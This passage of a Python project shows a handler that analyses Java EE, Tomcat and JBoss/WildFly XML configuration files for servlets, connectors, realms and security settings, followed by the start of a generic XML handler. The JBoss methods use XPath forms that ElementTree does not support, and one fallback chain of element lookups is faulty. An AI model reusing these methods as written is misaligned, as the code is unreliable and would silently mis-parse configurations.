                    score += min(indicator_count * 0.2, 0.5)
            
            if score >= 0.5:
                return True, score
        
        # Generic enterprise config detection
        enterprise_indicators = [
            'servlet', 'filter', 'listener', 'datasource', 'connection-pool',
            'security', 'realm', 'valve', 'cluster', 'deployment'
        ]
        
        indicator_count = sum(1 for ind in enterprise_indicators if root.find(f'.//{ind}') is not None)
        if indicator_count >= 2:
            return True, min(indicator_count * 0.2, 0.6)
        
        return False, 0.0
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        
        # Determine specific configuration type
        config_type = "Generic Enterprise Configuration"
        version = None
        
        # Check web.xml
        if root_tag == 'web-app':
            config_type = "Java EE Deployment Descriptor"
            version = root.get('version', '3.0')
            
            # Determine Java EE version from namespace
            for uri in namespaces.values():
                if 'javaee' in uri:
                    if 'javaee/7' in uri:
                        version = '3.1'  # Java EE 7
                    elif 'javaee/6' in uri:
                        version = '3.0'  # Java EE 6
                    elif 'j2ee' in uri:
                        version = '2.4'  # J2EE
        
        # Check Tomcat server.xml
        elif root_tag == 'Server':
            config_type = "Tomcat Server Configuration"
            # Try to detect Tomcat version from comments or attributes
            for comment in root.iter(ET.Comment):
                if 'Tomcat' in str(comment):
                    version_match = re.search(r'Tomcat (\d+(?:\.\d+)?)', str(comment))
                    if version_match:
                        version = version_match.group(1)
        
        # Check JBoss/WildFly
        elif 'urn:jboss:domain' in str(namespaces.values()):
            config_type = "JBoss/WildFly Configuration"
            # Extract version from namespace
            for uri in namespaces.values():
                version_match = re.search(r'domain:(\d+\.\d+)', uri)
                if version_match:
                    version = version_match.group(1)
        
        return DocumentTypeInfo(
            type_name=config_type,
            confidence=0.9,
            version=version,
            metadata={
                "category": "enterprise_configuration",
                "root_element": root_tag,
                "file_type": self._guess_file_type(root, namespaces)
            }
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        config_type = self._determine_config_type(root)
        
        # Route to specific analysis based on type
        if 'web.xml' in config_type or 'Deployment Descriptor' in config_type:
            findings = self._analyze_web_xml(root)
        elif 'Tomcat' in config_type and 'Server' in config_type:
            findings = self._analyze_tomcat_server(root)
        elif 'JBoss' in config_type or 'WildFly' in config_type:
            findings = self._analyze_jboss_config(root)
        else:
            findings = self._analyze_generic_config(root)
        
        recommendations = [
            "Review security configurations for vulnerabilities",
            "Check for hardcoded passwords and credentials",
            "Analyze resource pool settings for optimization",
            "Validate against security best practices",
            "Extract for configuration management database",
            "Monitor for configuration drift"
        ]
        
        ai_use_cases = [
            "Security misconfiguration detection",
            "Performance optimization recommendations",
            "Configuration compliance checking",
            "Automated documentation generation",
            "Migration planning assistance",
            "Configuration anomaly detection",
            "Resource optimization analysis",
            "Dependency impact analysis"
        ]
        
        return SpecializedAnalysis(
            document_type=config_type,
            key_findings=findings,
            recommendations=recommendations,
            data_inventory=self._create_inventory(findings),
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._assess_config_quality(findings)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        config_type = self._determine_config_type(root)
        
        base_data = {
            'configuration_type': config_type,
            'security_settings': self._extract_security_settings(root),
            'resource_definitions': self._extract_resources(root),
            'deployment_info': self._extract_deployment_info(root)
        }
        
        # Add type-specific data
        if 'web.xml' in config_type:
            base_data['servlets'] = self._extract_servlets(root)
            base_data['filters'] = self._extract_filters(root)
        elif 'Tomcat' in config_type:
            base_data['connectors'] = self._extract_connectors(root)
            base_data['hosts'] = self._extract_hosts(root)
        
        return base_data
    
    def _analyze_web_xml(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze Java EE web.xml deployment descriptor"""
        findings = {
            'servlets': self._analyze_servlets(root),
            'filters': self._analyze_filters(root),
            'listeners': self._analyze_listeners(root),
            'security': self._analyze_web_security(root),
            'context_params': self._extract_context_params(root),
            'error_pages': self._extract_error_pages(root),
            'welcome_files': self._extract_welcome_files(root),
            'session_config': self._extract_session_config(root)
        }
        
        return findings
    
    def _analyze_tomcat_server(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze Tomcat server.xml configuration"""
        findings = {
            'server_info': self._extract_server_info(root),
            'connectors': self._analyze_connectors(root),
            'engines': self._analyze_engines(root),
            'hosts': self._analyze_hosts(root),
            'valves': self._analyze_valves(root),
            'realms': self._analyze_realms(root),
            'resources': self._analyze_global_resources(root)
        }
        
        return findings
    
    def _analyze_jboss_config(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze JBoss/WildFly configuration"""
        findings = {
            'profiles': self._extract_profiles(root),
            'subsystems': self._analyze_subsystems(root),
            'interfaces': self._extract_interfaces(root),
            'socket_bindings': self._extract_socket_bindings(root),
            'deployments': self._extract_deployments(root),
            'datasources': self._extract_jboss_datasources(root)
        }
        
        return findings
    
    def _analyze_generic_config(self, root: ET.Element) -> Dict[str, Any]:
        """Generic analysis for unknown enterprise configs"""
        findings = {
            'structure': self._analyze_structure(root),
            'security_elements': self._find_security_elements(root),
            'connection_settings': self._find_connection_settings(root),
            'resource_pools': self._find_resource_pools(root),
            'deployment_settings': self._find_deployment_settings(root)
        }
        
        return findings
    
    # Web.xml specific methods
    def _analyze_servlets(self, root: ET.Element) -> List[Dict[str, Any]]:
        servlets = []
        
        # Handle different namespace possibilities
        servlet_tags = root.findall('.//servlet') + \
                      root.findall('.//{http://java.sun.com/xml/ns/javaee}servlet') + \
                      root.findall('.//{http://xmlns.jcp.org/xml/ns/javaee}servlet')
        
        for servlet in servlet_tags:
            servlet_info = {
                'name': self._get_child_text(servlet, 'servlet-name'),
                'class': self._get_child_text(servlet, 'servlet-class'),
                'jsp_file': self._get_child_text(servlet, 'jsp-file'),
                'init_params': self._extract_init_params(servlet),
                'load_on_startup': self._get_child_text(servlet, 'load-on-startup')
            }
            
            servlets.append(servlet_info)
        
        # Extract servlet mappings
        mappings = {}
        mapping_tags = root.findall('.//servlet-mapping') + \
                      root.findall('.//{http://java.sun.com/xml/ns/javaee}servlet-mapping') + \
                      root.findall('.//{http://xmlns.jcp.org/xml/ns/javaee}servlet-mapping')
        
        for mapping in mapping_tags:
            name = self._get_child_text(mapping, 'servlet-name')
            pattern = self._get_child_text(mapping, 'url-pattern')
            if name and pattern:
                if name not in mappings:
                    mappings[name] = []
                mappings[name].append(pattern)
        
        # Add mappings to servlet info
        for servlet in servlets:
            servlet['url_patterns'] = mappings.get(servlet['name'], [])
        
        return servlets
    
    def _analyze_filters(self, root: ET.Element) -> List[Dict[str, Any]]:
        filters = []
        
        filter_tags = root.findall('.//filter') + \
                     root.findall('.//{http://java.sun.com/xml/ns/javaee}filter') + \
                     root.findall('.//{http://xmlns.jcp.org/xml/ns/javaee}filter')
        
        for filter_elem in filter_tags:
            filter_info = {
                'name': self._get_child_text(filter_elem, 'filter-name'),
                'class': self._get_child_text(filter_elem, 'filter-class'),
                'init_params': self._extract_init_params(filter_elem)
            }
            filters.append(filter_info)
        
        # Extract filter mappings
        filter_mappings = {}
        mapping_tags = root.findall('.//filter-mapping') + \
                      root.findall('.//{http://java.sun.com/xml/ns/javaee}filter-mapping') + \
                      root.findall('.//{http://xmlns.jcp.org/xml/ns/javaee}filter-mapping')
        
        for mapping in mapping_tags:
            name = self._get_child_text(mapping, 'filter-name')
            pattern = self._get_child_text(mapping, 'url-pattern')
            servlet = self._get_child_text(mapping, 'servlet-name')
            
            if name:
                if name not in filter_mappings:
                    filter_mappings[name] = {'patterns': [], 'servlets': []}
                if pattern:
                    filter_mappings[name]['patterns'].append(pattern)
                if servlet:
                    filter_mappings[name]['servlets'].append(servlet)
        
        # Add mappings to filter info
        for filter_info in filters:
            mappings = filter_mappings.get(filter_info['name'], {})
            filter_info['url_patterns'] = mappings.get('patterns', [])
            filter_info['servlet_names'] = mappings.get('servlets', [])
        
        return filters
    
    def _analyze_listeners(self, root: ET.Element) -> List[str]:
        listeners = []
        
        listener_tags = root.findall('.//listener') + \
                       root.findall('.//{http://java.sun.com/xml/ns/javaee}listener') + \
                       root.findall('.//{http://xmlns.jcp.org/xml/ns/javaee}listener')
        
        for listener in listener_tags:
            listener_class = self._get_child_text(listener, 'listener-class')
            if listener_class:
                listeners.append(listener_class)
        
        return listeners
    
    def _analyze_web_security(self, root: ET.Element) -> Dict[str, Any]:
        security = {
            'constraints': [],
            'roles': [],
            'login_config': None
        }
        
        # Security constraints
        constraint_tags = root.findall('.//security-constraint') + \
                         root.findall('.//{http://java.sun.com/xml/ns/javaee}security-constraint') + \
                         root.findall('.//{http://xmlns.jcp.org/xml/ns/javaee}security-constraint')
        
        for constraint in constraint_tags:
            constraint_info = {
                'web_resources': [],
                'auth_constraint': None,
                'user_data_constraint': None
            }
            
            # Web resource collections
            for resource in constraint.findall('.//web-resource-collection'):
                resource_info = {
                    'name': self._get_child_text(resource, 'web-resource-name'),
                    'patterns': [p.text for p in resource.findall('.//url-pattern') if p.text],
                    'methods': [m.text for m in resource.findall('.//http-method') if m.text]
                }
                constraint_info['web_resources'].append(resource_info)
            
            # Auth constraint
            auth = constraint.find('.//auth-constraint')
            if auth is not None:
                constraint_info['auth_constraint'] = {
                    'roles': [r.text for r in auth.findall('.//role-name') if r.text]
                }
            
            # User data constraint
            user_data = constraint.find('.//user-data-constraint')
            if user_data is not None:
                transport = user_data.find('.//transport-guarantee')
                if transport is not None:
                    constraint_info['user_data_constraint'] = transport.text
            
            security['constraints'].append(constraint_info)
        
        # Security roles
        role_tags = root.findall('.//security-role') + \
                   root.findall('.//{http://java.sun.com/xml/ns/javaee}security-role') + \
                   root.findall('.//{http://xmlns.jcp.org/xml/ns/javaee}security-role')
        
        for role in role_tags:
            role_name = self._get_child_text(role, 'role-name')
            if role_name:
                security['roles'].append(role_name)
        
        # Login config
        login_config = root.find('.//login-config') or \
                      root.find('.//{http://java.sun.com/xml/ns/javaee}login-config') or \
                      root.find('.//{http://xmlns.jcp.org/xml/ns/javaee}login-config')
        
        if login_config is not None:
            security['login_config'] = {
                'auth_method': self._get_child_text(login_config, 'auth-method'),
                'realm_name': self._get_child_text(login_config, 'realm-name'),
                'form_config': self._extract_form_config(login_config)
            }
        
        return security
    
    # Tomcat specific methods
    def _analyze_connectors(self, root: ET.Element) -> List[Dict[str, Any]]:
        connectors = []
        
        for connector in root.findall('.//Connector'):
            connector_info = {
                'port': connector.get('port'),
                'protocol': connector.get('protocol', 'HTTP/1.1'),
                'secure': connector.get('secure', 'false') == 'true',
                'scheme': connector.get('scheme', 'http'),
                'ssl_enabled': connector.get('SSLEnabled', 'false') == 'true'
            }
            
            # Extract all attributes for detailed analysis
            connector_info['attributes'] = dict(connector.attrib)
            
            connectors.append(connector_info)
        
        return connectors
    
    def _analyze_engines(self, root: ET.Element) -> List[Dict[str, Any]]:
        engines = []
        
        for engine in root.findall('.//Engine'):
            engine_info = {
                'name': engine.get('name'),
                'default_host': engine.get('defaultHost'),
                'hosts': []
            }
            
            # Get nested hosts
            for host in engine.findall('.//Host'):
                host_info = {
                    'name': host.get('name'),
                    'app_base': host.get('appBase'),
                    'unpack_wars': host.get('unpackWARs', 'true') == 'true',
                    'auto_deploy': host.get('autoDeploy', 'true') == 'true'
                }
                engine_info['hosts'].append(host_info)
            
            engines.append(engine_info)
        
        return engines
    
    def _analyze_hosts(self, root: ET.Element) -> List[Dict[str, Any]]:
        hosts = []
        
        for host in root.findall('.//Host'):
            host_info = {
                'name': host.get('name'),
                'app_base': host.get('appBase'),
                'contexts': [],
                'valves': []
            }
            
            # Get contexts
            for context in host.findall('.//Context'):
                context_info = {
                    'path': context.get('path'),
                    'doc_base': context.get('docBase'),
                    'reloadable': context.get('reloadable', 'false') == 'true'
                }
                host_info['contexts'].append(context_info)
            
            # Get valves
            for valve in host.findall('.//Valve'):
                valve_info = {
                    'class_name': valve.get('className'),
                    'attributes': dict(valve.attrib)
                }
                host_info['valves'].append(valve_info)
            
            hosts.append(host_info)
        
        return hosts
    
    def _analyze_valves(self, root: ET.Element) -> List[Dict[str, Any]]:
        valves = []
        
        for valve in root.findall('.//Valve'):
            valve_info = {
                'class_name': valve.get('className'),
                'pattern': valve.get('pattern'),
                'directory': valve.get('directory'),
                'prefix': valve.get('prefix'),
                'suffix': valve.get('suffix')
            }
            
            # Identify valve type
            class_name = valve.get('className', '')
            if 'AccessLogValve' in class_name:
                valve_info['type'] = 'access_log'
            elif 'RemoteIpValve' in class_name:
                valve_info['type'] = 'remote_ip'
            elif 'ErrorReportValve' in class_name:
                valve_info['type'] = 'error_report'
            else:
                valve_info['type'] = 'custom'
            
            valves.append(valve_info)
        
        return valves
    
    def _analyze_realms(self, root: ET.Element) -> List[Dict[str, Any]]:
        realms = []
        
        for realm in root.findall('.//Realm'):
            realm_info = {
                'class_name': realm.get('className'),
                'attributes': dict(realm.attrib)
            }
            
            # Identify realm type
            class_name = realm.get('className', '')
            if 'UserDatabaseRealm' in class_name:
                realm_info['type'] = 'user_database'
            elif 'JDBCRealm' in class_name:
                realm_info['type'] = 'jdbc'
            elif 'DataSourceRealm' in class_name:
                realm_info['type'] = 'datasource'
            elif 'JNDIRealm' in class_name:
                realm_info['type'] = 'jndi'
            else:
                realm_info['type'] = 'custom'
            
            realms.append(realm_info)
        
        return realms
    
    def _analyze_global_resources(self, root: ET.Element) -> List[Dict[str, Any]]:
        resources = []
        
        global_resources = root.find('.//GlobalNamingResources')
        if global_resources is not None:
            for resource in global_resources.findall('.//Resource'):
                resource_info = {
                    'name': resource.get('name'),
                    'auth': resource.get('auth'),
                    'type': resource.get('type'),
                    'attributes': dict(resource.attrib)
                }
                resources.append(resource_info)
        
        return resources
    
    # JBoss/WildFly specific methods
    def _extract_profiles(self, root: ET.Element) -> List[Dict[str, Any]]:
        profiles = []
        
        for profile in root.findall('.//{urn:jboss:domain:*}profile'):
            profile_info = {
                'name': profile.get('name'),
                'subsystems': []
            }
            
            # Count subsystems
            for subsystem in profile.findall('.//{urn:jboss:domain:*}subsystem'):
                profile_info['subsystems'].append(subsystem.tag.split('}')[-1])
            
            profiles.append(profile_info)
        
        return profiles
    
    def _analyze_subsystems(self, root: ET.Element) -> Dict[str, Any]:
        subsystems = {}
        
        # Common subsystems to look for
        subsystem_patterns = [
            'datasources', 'security', 'web', 'ejb3', 'transactions',
            'messaging', 'logging', 'deployment-scanner'
        ]
        
        for pattern in subsystem_patterns:
            elements = root.findall(f'.//*[local-name()="{pattern}"]')
            if elements:
                subsystems[pattern] = len(elements)
        
        return subsystems
    
    def _extract_interfaces(self, root: ET.Element) -> List[Dict[str, str]]:
        interfaces = []
        
        for interface in root.findall('.//*[local-name()="interface"]'):
            interfaces.append({
                'name': interface.get('name'),
                'inet_address': interface.find('.//*[local-name()="inet-address"]').get('value', '')
                if interface.find('.//*[local-name()="inet-address"]') is not None else ''
            })
        
        return interfaces
    
    def _extract_socket_bindings(self, root: ET.Element) -> List[Dict[str, Any]]:
        bindings = []
        
        for binding in root.findall('.//*[local-name()="socket-binding"]'):
            bindings.append({
                'name': binding.get('name'),
                'port': binding.get('port'),
                'interface': binding.get('interface')
            })
        
        return bindings[:10]  # Limit to first 10
    
    def _extract_deployments(self, root: ET.Element) -> List[Dict[str, str]]:
        deployments = []
        
        for deployment in root.findall('.//*[local-name()="deployment"]'):
            deployments.append({
                'name': deployment.get('name'),
                'runtime_name': deployment.get('runtime-name', deployment.get('name'))
            })
        
        return deployments
    
    def _extract_jboss_datasources(self, root: ET.Element) -> List[Dict[str, Any]]:
        datasources = []
        
        for ds in root.findall('.//*[local-name()="datasource"]'):
            datasources.append({
                'jndi_name': ds.get('jndi-name'),
                'pool_name': ds.get('pool-name'),
                'enabled': ds.get('enabled', 'true') == 'true',
                'driver': ds.find('.//*[local-name()="driver"]').text if ds.find('.//*[local-name()="driver"]') is not None else None
            })
        
        return datasources
    
    # Generic analysis methods
    def _analyze_structure(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'root_element': root.tag,
            'total_elements': len(list(root.iter())),
            'max_depth': self._calculate_max_depth(root),
            'unique_tags': len(set(elem.tag for elem in root.iter()))
        }
    
    def _find_security_elements(self, root: ET.Element) -> List[Dict[str, Any]]:
        security_elements = []
        security_keywords = ['security', 'auth', 'role', 'permission', 'credential', 'password', 'realm']
        
        for elem in root.iter():
            tag_lower = elem.tag.lower()
            if any(keyword in tag_lower for keyword in security_keywords):
                security_elements.append({
                    'tag': elem.tag,
                    'attributes': dict(elem.attrib),
                    'has_sensitive_data': self._check_sensitive_data(elem)
                })
        
        return security_elements[:20]  # Limit results
    
    def _find_connection_settings(self, root: ET.Element) -> List[Dict[str, Any]]:
        connections = []
        connection_keywords = ['connection', 'datasource', 'pool', 'jdbc', 'url', 'host', 'port']
        
        for elem in root.iter():
            tag_lower = elem.tag.lower()
            if any(keyword in tag_lower for keyword in connection_keywords):
                connections.append({
                    'tag': elem.tag,
                    'attributes': dict(elem.attrib)
                })
        
        return connections[:15]
    
    def _find_resource_pools(self, root: ET.Element) -> List[Dict[str, Any]]:
        pools = []
        pool_keywords = ['pool', 'max-size', 'min-size', 'timeout']
        
        for elem in root.iter():
            if any(keyword in elem.tag.lower() or keyword in str(elem.attrib).lower() 
                  for keyword in pool_keywords):
                pools.append({
                    'tag': elem.tag,
                    'configuration': dict(elem.attrib)
                })
        
        return pools
    
    def _find_deployment_settings(self, root: ET.Element) -> Dict[str, Any]:
        deployment_info = {
            'contexts': [],
            'applications': [],
            'modules': []
        }
        
        # Look for context paths
        for elem in root.iter():
            if 'context' in elem.tag.lower() and elem.get('path'):
                deployment_info['contexts'].append(elem.get('path'))
            elif 'application' in elem.tag.lower() and elem.get('name'):
                deployment_info['applications'].append(elem.get('name'))
            elif 'module' in elem.tag.lower() and elem.get('name'):
                deployment_info['modules'].append(elem.get('name'))
        
        return deployment_info
    
    # Utility methods
    def _determine_config_type(self, root: ET.Element) -> str:
        """Determine the specific configuration type"""
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        
        if root_tag == 'web-app':
            return "Java EE Web Application Deployment Descriptor"
        elif root_tag == 'Server':
            return "Tomcat Server Configuration"
        elif root_tag == 'Context':
            return "Tomcat Context Configuration"
        elif 'jboss' in root.tag:
            return "JBoss/WildFly Configuration"
        else:
            return "Enterprise Application Configuration"
    
    def _guess_file_type(self, root: ET.Element, namespaces: Dict[str, str]) -> str:
        """Guess the configuration file type"""
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        
        if root_tag == 'web-app':
            return 'web.xml'
        elif root_tag == 'Server':
            return 'server.xml'
        elif root_tag == 'Context':
            return 'context.xml'
        elif 'jboss' in str(namespaces.values()):
            return 'standalone.xml'
        else:
            return 'config.xml'
    
    def _get_child_text(self, parent: ET.Element, child_name: str) -> Optional[str]:
        """Get text content of a child element"""
        child = parent.find(f'.//{child_name}')
        if child is None:
            # Try with common namespaces
            for ns in ['{http://java.sun.com/xml/ns/javaee}', '{http://xmlns.jcp.org/xml/ns/javaee}']:
                child = parent.find(f'.//{ns}{child_name}')
                if child is not None:
                    break
        
        return child.text if child is not None else None
    
    def _extract_init_params(self, parent: ET.Element) -> Dict[str, str]:
        """Extract init parameters"""
        params = {}
        
        for param in parent.findall('.//init-param'):
            name = self._get_child_text(param, 'param-name')
            value = self._get_child_text(param, 'param-value')
            if name and value:
                params[name] = value
        
        return params
    
    def _extract_context_params(self, root: ET.Element) -> Dict[str, str]:
        """Extract context parameters"""
        params = {}
        
        for param in root.findall('.//context-param'):
            name = self._get_child_text(param, 'param-name')
            value = self._get_child_text(param, 'param-value')
            if name and value:
                params[name] = value
        
        return params
    
    def _extract_error_pages(self, root: ET.Element) -> List[Dict[str, str]]:
        """Extract error page mappings"""
        error_pages = []
        
        for page in root.findall('.//error-page'):
            page_info = {}
            
            error_code = self._get_child_text(page, 'error-code')
            exception_type = self._get_child_text(page, 'exception-type')
            location = self._get_child_text(page, 'location')
            
            if error_code:
                page_info['error_code'] = error_code
            if exception_type:
                page_info['exception_type'] = exception_type
            if location:
                page_info['location'] = location
            
            if page_info:
                error_pages.append(page_info)
        
        return error_pages
    
    def _extract_welcome_files(self, root: ET.Element) -> List[str]:
        """Extract welcome file list"""
        welcome_files = []
        
        welcome_list = root.find('.//welcome-file-list')
        if welcome_list is not None:
            for file_elem in welcome_list.findall('.//welcome-file'):
                if file_elem.text:
                    welcome_files.append(file_elem.text)
        
        return welcome_files
    
    def _extract_session_config(self, root: ET.Element) -> Dict[str, Any]:
        """Extract session configuration"""
        session_config = {}
        
        config = root.find('.//session-config')
        if config is not None:
            timeout = self._get_child_text(config, 'session-timeout')
            if timeout:
                session_config['timeout_minutes'] = timeout
            
            # Cookie config
            cookie_config = config.find('.//cookie-config')
            if cookie_config is not None:
                session_config['cookie'] = {
                    'name': self._get_child_text(cookie_config, 'name'),
                    'domain': self._get_child_text(cookie_config, 'domain'),
                    'path': self._get_child_text(cookie_config, 'path'),
                    'secure': self._get_child_text(cookie_config, 'secure') == 'true',
                    'http_only': self._get_child_text(cookie_config, 'http-only') == 'true'
                }
        
        return session_config
    
    def _extract_form_config(self, login_config: ET.Element) -> Optional[Dict[str, str]]:
        """Extract form login configuration"""
        form_config = login_config.find('.//form-login-config')
        if form_config is not None:
            return {
                'login_page': self._get_child_text(form_config, 'form-login-page'),
                'error_page': self._get_child_text(form_config, 'form-error-page')
            }
        return None
    
    def _extract_server_info(self, root: ET.Element) -> Dict[str, Any]:
        """Extract server-level information"""
        server = root
        
        return {
            'port': server.get('port', '8005'),
            'shutdown': server.get('shutdown', 'SHUTDOWN'),
            'services': len(server.findall('.//Service'))
        }
    
    def _extract_security_settings(self, root: ET.Element) -> Dict[str, Any]:
        """Extract security-related settings"""
        return {
            'security_constraints': len(root.findall('.//security-constraint')),
            'security_roles': [r.text for r in root.findall('.//role-name') if r.text],
            'auth_methods': list(set(m.text for m in root.findall('.//auth-method') if m.text)),
            'ssl_enabled': any(c.get('SSLEnabled') == 'true' for c in root.findall('.//Connector'))
        }
    
    def _extract_resources(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract resource definitions"""
        resources = []
        
        # Standard resources
        for resource in root.findall('.//Resource'):
            resources.append({
                'name': resource.get('name'),
                'type': resource.get('type'),
                'auth': resource.get('auth')
            })
        
        # DataSources
        for ds in root.findall('.//DataSource'):
            resources.append({
                'name': ds.get('name'),
                'type': 'DataSource',
                'jndi_name': ds.get('jndiName')
            })
        
        return resources[:20]  # Limit
    
    def _extract_deployment_info(self, root: ET.Element) -> Dict[str, Any]:
        """Extract deployment-related information"""
        return {
            'contexts': [c.get('path') for c in root.findall('.//Context') if c.get('path')],
            'web_apps': [w.get('docBase') for w in root.findall('.//Context') if w.get('docBase')],
            'auto_deploy': any(h.get('autoDeploy') == 'true' for h in root.findall('.//Host'))
        }
    
    def _extract_servlets(self, root: ET.Element) -> List[Dict[str, str]]:
        """Extract servlet definitions"""
        servlets = []
        
        for servlet in root.findall('.//servlet'):
            servlets.append({
                'name': self._get_child_text(servlet, 'servlet-name'),
                'class': self._get_child_text(servlet, 'servlet-class'),
                'load_on_startup': self._get_child_text(servlet, 'load-on-startup')
            })
        
        return servlets[:20]
    
    def _extract_filters(self, root: ET.Element) -> List[Dict[str, str]]:
        """Extract filter definitions"""
        filters = []
        
        for filter_elem in root.findall('.//filter'):
            filters.append({
                'name': self._get_child_text(filter_elem, 'filter-name'),
                'class': self._get_child_text(filter_elem, 'filter-class')
            })
        
        return filters[:20]
    
    def _extract_connectors(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract connector configurations"""
        connectors = []
        
        for connector in root.findall('.//Connector'):
            connectors.append({
                'port': connector.get('port'),
                'protocol': connector.get('protocol'),
                'secure': connector.get('secure') == 'true',
                'ssl_enabled': connector.get('SSLEnabled') == 'true'
            })
        
        return connectors
    
    def _extract_hosts(self, root: ET.Element) -> List[Dict[str, str]]:
        """Extract host configurations"""
        hosts = []
        
        for host in root.findall('.//Host'):
            hosts.append({
                'name': host.get('name'),
                'app_base': host.get('appBase'),
                'auto_deploy': host.get('autoDeploy')
            })
        
        return hosts
    
    def _calculate_max_depth(self, elem: ET.Element, depth: int = 0) -> int:
        """Calculate maximum depth of XML tree"""
        if not list(elem):
            return depth
        return max(self._calculate_max_depth(child, depth + 1) for child in elem)
    
    def _check_sensitive_data(self, elem: ET.Element) -> bool:
        """Check if element might contain sensitive data"""
        sensitive_keywords = ['password', 'secret', 'key', 'token', 'credential']
        
        # Check tag name
        if any(keyword in elem.tag.lower() for keyword in sensitive_keywords):
            return True
        
        # Check attributes
        for attr_name, attr_value in elem.attrib.items():
            if any(keyword in attr_name.lower() for keyword in sensitive_keywords):
                return True
            # Check for non-empty password values
            if 'password' in attr_name.lower() and attr_value and attr_value != '*':
                return True
        
        return False
    
    def _create_inventory(self, findings: Dict[str, Any]) -> Dict[str, int]:
        """Create data inventory from findings"""
        inventory = {}
        
        # Count various elements based on findings structure
        if 'servlets' in findings:
            inventory['servlets'] = len(findings['servlets'])
        if 'filters' in findings:
            inventory['filters'] = len(findings['filters'])
        if 'connectors' in findings:
            inventory['connectors'] = len(findings['connectors'])
        if 'datasources' in findings:
            inventory['datasources'] = len(findings['datasources'])
        if 'security' in findings and 'constraints' in findings['security']:
            inventory['security_constraints'] = len(findings['security']['constraints'])
        
        return inventory
    
    def _assess_config_quality(self, findings: Dict[str, Any]) -> Dict[str, float]:
        """Assess configuration quality"""
        scores = {}
        
        # Security score
        security_score = 0.0
        if 'security' in findings:
            if findings['security'].get('constraints'):
                security_score += 0.3
            if findings['security'].get('login_config'):
                security_score += 0.3
            if findings['security'].get('roles'):
                security_score += 0.2
            # Check for HTTPS
            if 'connectors' in findings:
                if any(c.get('secure') or c.get('ssl_enabled') for c in findings['connectors']):
                    security_score += 0.2
        scores['security'] = min(security_score, 1.0)
        
        # Configuration completeness
        completeness = 0.0
        expected_elements = ['servlets', 'security', 'session_config', 'error_pages']
        for element in expected_elements:
            if element in findings and findings[element]:
                completeness += 0.25
        scores['completeness'] = completeness
        
        # Best practices
        best_practices = 0.0
        
        # Check session timeout
        if 'session_config' in findings and findings['session_config'].get('timeout_minutes'):
            best_practices += 0.25
        
        # Check error handling
        if 'error_pages' in findings and len(findings['error_pages']) > 0:
            best_practices += 0.25
        
        # Check for secure cookies
        if 'session_config' in findings and 'cookie' in findings['session_config']:
            cookie = findings['session_config']['cookie']
            if cookie.get('secure') and cookie.get('http_only'):
                best_practices += 0.5
        
        scores['best_practices'] = best_practices
        
        # Overall quality
        scores['overall'] = sum(scores.values()) / len(scores)
        
        return scores
</file>

<file path="src/handlers/generic_xml_handler.py">
#!/usr/bin/env python3
"""
Generic XML Handler

Fallback handler for processing any XML document type when no specialized
handler is available. Provides general-purpose XML analysis and structure
detection capabilities.

This handler serves as the default option and performs basic XML document
analysis including structure analysis, pattern detection, and data extraction.
"""

import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
import sys
import os

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.analyzer import XMLHandler, DocumentTypeInfo, SpecializedAnalysis


class GenericXMLHandler(XMLHandler):
    """Fallback handler for generic XML documents"""
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        # This handler can handle any XML
        return True, 0.1  # Low confidence as it's a fallback
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        # Try to infer type from root element and namespaces
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        
        return DocumentTypeInfo(
            type_name=f"Generic XML ({root_tag})",
            confidence=0.5,
            metadata={
                "root_element": root_tag,
                "namespace_count": len(namespaces)
            }
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        findings = {
            'structure': self._analyze_structure(root),
            'data_patterns': self._detect_patterns(root),
            'attribute_usage': self._analyze_attributes(root)
        }
        
        recommendations = [
            "Review structure for data extraction opportunities",
            "Consider creating a specialized handler for this document type",
            "Analyze repeating patterns for structured data extraction"
        ]
        
        ai_use_cases = [
            "Schema learning and validation",
            "Data extraction and transformation",
            "Pattern recognition",
            "Anomaly detection in structure"
        ]
        
        return SpecializedAnalysis(
            document_type="Generic XML",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory=self._inventory_data(root),
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._analyze_quality(root)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'sample_data': self._extract_samples(root),
            'schema_inference': self._infer_schema(root)
        }
    
    def _analyze_structure(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'max_depth': self._calculate_depth(root),
            'element_count': len(list(root.iter())),
            'unique_paths': len(self._get_unique_paths(root))
        }
    
    def _detect_patterns(self, root: ET.Element) -> Dict[str, Any]:
        # Detect repeating structures
        element_counts = {}
        for elem in root.iter():
            tag = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            element_counts[tag] = element_counts.get(tag, 0) + 1
        
        return {
            'repeating_elements': {k: v for k, v in element_counts.items() if v > 5},
            'likely_records': [k for k, v in element_counts.items() if v > 10]
        }
    
    def _analyze_attributes(self, root: ET.Element) -> Dict[str, Any]:
        attr_usage = {}
        for elem in root.iter():
            for attr in elem.attrib:
                attr_usage[attr] = attr_usage.get(attr, 0) + 1
        return attr_usage
    
    def _inventory_data(self, root: ET.Element) -> Dict[str, int]:
        inventory = {}
        for elem in root.iter():
            tag = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            inventory[tag] = inventory.get(tag, 0) + 1
        return inventory
    
